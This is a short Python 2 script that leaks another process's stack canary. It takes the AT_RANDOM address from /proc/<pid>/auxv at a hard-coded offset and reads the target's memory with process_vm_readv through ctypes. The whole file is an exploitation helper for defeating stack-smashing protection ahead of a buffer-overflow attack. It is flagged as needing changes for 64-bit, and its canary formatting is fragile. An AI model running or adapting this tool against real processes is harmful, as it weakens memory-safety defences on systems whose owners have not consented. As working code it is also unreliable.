#needs tweak for 64bit
from ctypes import *
import sys, struct

pid = int(sys.argv[1])
path = "/proc/%s/auxv" % (pid)
buflen = sizeof(c_long)*2

def dump_memory(pid,addr,buflen):
    class iovec(Structure):
        _fields_ = [("iov_base",c_void_p),("iov_len",c_size_t)]

    local = (iovec*2)()[1]
    remote =  (iovec*1)()[0]
    buf1 = (c_char*buflen)()

    local.iov_base = cast(buf1,c_void_p)
    local.iov_len = buflen
    remote.iov_base = c_void_p(addr)
    remote.iov_len = buflen

    libc = CDLL("libc.so.6")
    vm = libc.process_vm_readv

    vm.argtypes = [c_int, POINTER(iovec), c_ulong, POINTER(iovec), c_ulong, c_ulong]

    nread = vm(pid,local,2,remote,1,0)
    if nread != -1:
        bytes = "[+] "
        print "[+] got %s bytes" % (nread)
        for i in buf1: bytes += hex(ord(i)) + " "
        canary = hex(ord(buf1[3]))+hex(ord(buf1[2]))[2:]+hex(ord(buf1[1]))[2:]+"00"
        print bytes + "\n[+] canary for PID=%s is %s" % (pid,canary)


def get_at_random_address(pid,path):
    a = open(path, "rb")
    a.seek(0x88-4)
    b = struct.unpack("<L",a.read(4))[0]
    a.close()
    return b


def main():
    print "[+] reading auxv of pid=%s" % pid
    print "[+] pid=%s, path=%s" % (pid,path)
    addr = get_at_random_address(pid,path)
    print "[+] reading %s bytes from pid=%s from address %s" % (buflen,pid,hex(addr)[:-1])
    dump_memory(pid,addr,buflen)

if __name__ == '__main__':
    main()
